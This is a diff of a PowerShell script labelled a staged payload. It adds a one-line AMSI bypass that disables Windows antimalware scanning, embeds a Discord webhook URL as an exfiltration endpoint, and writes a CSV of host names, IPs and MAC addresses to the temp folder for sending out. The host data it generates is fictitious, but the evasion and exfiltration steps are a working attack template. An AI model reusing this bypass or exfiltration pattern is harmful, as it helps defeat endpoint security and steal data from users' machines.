@@ -1,14 +1,15 @@
+# [BYPASS AMSI]
+$a=[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils');$a.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+
 # PAYLOAD (.ps1) - Hostinfo Generator Staged
 $u = 'https://discord.com/api/webhooks/1484361195443196066/GoX9619rfnS7zha8MBZzXEdsReSFosFYFbtFyVfNPVxybJXyXVw7TkLPoj5M-g6nWaXX'
 
-# Função para gerar MAC aleatório
 function Get-RandomMac {
     $hex = 0..15 | ForEach-Object { "{0:X}" -f $_ }
     $mac = (1..6 | ForEach-Object { ($hex | Get-Random) + ($hex | Get-Random) }) -join ':'
     return $mac
 }
 
-# Geração de 10 entradas fictícias (CSV)
 $report = "Host,IP Address,MAC Address`n"
 $sites = @('RUB','BER','DUC','KIE','CAN','HAK')
 $types = @('L','V','S','T','D')
@@ -20,7 +21,6 @@ for ($i=1; $i -le 10; $i++) {
     $report += "$hostName,$ip,$mac`n"
 }
 
-# Salvar temporariamente e exfiltrar
 $f = "$env:TEMP\hostinfo.csv"
 $report | Out-File -FilePath $f -Encoding ascii
 
